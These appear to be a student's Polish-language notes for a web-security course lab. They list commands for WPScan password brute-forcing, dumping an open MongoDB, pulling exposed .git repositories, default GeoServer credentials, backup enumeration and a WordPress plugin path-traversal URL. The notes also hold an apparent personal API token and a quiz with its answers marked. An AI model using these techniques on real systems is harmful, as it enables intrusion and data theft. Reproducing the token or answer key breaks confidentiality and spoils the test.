wpscan --url http://10.0.74.203 -U CyberSkiller -P SecLists/Passwords/Common-Credentials/10k-most-common.txt
```
## Zadanie 2 (Niebezpieczna konfiguracja serwera bazy danych)
[Security of Web Applications - Insecure database server configuration - 8.2](https://www.youtube.com/watch?v=yMf9FTH20rE)
```shell
mongostat -h 10.0.30.208
mongodump -h 10.0.30.208
ls
cd dump
cd admin
cat exercise_flag.bson
```
## Zadanie 3 (Publicznie dostępny serwer deweloperski)
[Security of Web applications - Publicly accessible development server - 8.3](https://www.youtube.com/watch?v=6oElvxLevuo)
```shell
http://10.0.89.159/.git/
wget -r http://10.0.89.159/.git/
ls -la
git log
git checkout ce03384a1246ae9d2727821c53e37f7b74df798c
cat secret.txt
```
## Zadanie 4 (Wykorzystanie domyślnych haseł)
[Security of Web Applications - Using default passwords - 8.4](https://www.youtube.com/watch?v=jKY8NLrSLAg)
```shell
h: admin
p: geoserver
grep CS geoserver.log
```
## Zadanie 5 (Nieaktualne oprogramowanie ze znanymi podatnościami)
[Security of Web Applications - Outdated software with known vulnerabilities - 8.5](https://www.youtube.com/watch?v=IwUVbFc09rs)
```shell
wpscan --url
my api token: MRb9ShKDAmjcGhJi5xc26n5Qjthvq5sBrzJekz71tk4
http://10.0.80.82/wp-admin/edit.php?post_type=wd_ads_ads&export=export_csv&path=../../secret.txt
```
## Zadanie 6 (Publicznie dostępny backup)
[Security of Web Applications - Publicly available backup - 8.6](https://www.youtube.com/watch?v=efYxepAYAHg)
```shell
gobuster dir -u http://10.0.22.93/backups -w /usr/share/dirb/wordlists/common.txt
http://10.0.22.93/backups/backup.zip
gobuster dir -u http://10.0.119.7/backups/ -w /usr/share/dirb/wordlists/common.txt -x zip

```
## Zadanie 7 (Przegląd udostępnionego repozytorium kodu)
[Security of Web Applications - Browsing public code repository - 8.7](https://www.youtube.com/watch?v=TIdD_knNF7Y)
```shell
./gitdumper.sh http://10.0.4.97/.git/ ~/git-repo/
cd ~/git-repo
ls -la
git log
git checkout . 
cd secrets
cat secret.txt
```
## Zadanie 8 (Test sprawdzający)
1. Oceń prawdziwość zdania. Większość domyślnych konfiguracji dostarczanych w oprogramowaniu jest odpowiednio zabezpieczona i przeznaczona na serwery produkcyjne.
	-   Prawda
	-   Fałsz +
2. Bazy danych MySQL posiadają domyślnie konto użytkownika root bez zabezpieczenia w postaci hasła, a dostęp do bazy inny niż lokalny jest domyślnie zablokowany. Czy taka konfiguracja jest bezpieczna?
	-   Prawda
	-   Fałsz +
3. Która z poniższych informacji o dowolnym serwisie może prowadzić do odnalezienia luki bezpieczeństwa w oprogramowaniu?
	-   Numer portu na którym działa serwis
	-   Nazwa serwisu wyświetlana w programie nmap
	-   Wersja serwisu + 
4. Oceń prawdziwość zdania. Aktualizacja oprogramowania jest ważnym elementem w aspekcie bezpieczeństwa aplikacji.
	-   Prawda +
	-   Fałsz
5. Oceń prawdziwość zdania. Uruchamiając nowy router ustawienie protokółu zabezpieczającego sieć WiFi jest wystarczającą konfiguracją routera.
	-   Prawda
	-   Fałsz +
